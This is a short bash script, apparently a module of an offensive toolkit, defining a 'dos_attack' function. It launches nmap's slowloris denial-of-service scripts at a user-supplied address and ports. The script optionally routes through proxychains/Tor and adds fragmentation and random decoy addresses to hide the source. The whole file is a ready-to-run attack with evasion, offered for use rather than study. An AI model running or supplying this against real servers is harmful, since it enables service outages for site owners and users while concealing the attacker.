#! /bin/bash

source ./assets/set_color.sh

source ./lib/scan/helpers/inputs.sh
source ./lib/scan/helpers/create_dir.sh
source ./lib/settings/services.sh
source ./lib/util/success_output.sh

source ./validators/ipv4_validator.sh


function dos_attack()
{
	services "DOS attack"

  proxychains_input
  if [[ $proxychains == [Yy] ]]; then
    is_tor="proxychains4"
  else
    is_tor=""
  fi

	dns_input
  ipv4_validator "$dns"
  if [ $? -ne 0 ]; then
    return 1
  fi

	ports_input

	debug_mode
	if [[ $debug == [Yy] ]]; then
		debug_flag="-d"
	else
		debug_flag=""
	fi

	dir_input
	create_dir "$dir_name/attacks/dos"


	$is_tor nmap -p"$ports" --script=http-slowloris-check,http-slowloris \
	 --max-parallelism=400 \
	 -f --send-eth -D RND:3 \
	 --script-args=http-slowloris.timelimit $debug_flag \
	 -oN "$HOME/$dir_name/attacks/dos/$dns.nmap" "$dns"

	success_output "$HOME/$dir_name/attacks/dos/$dns.nmap"
}
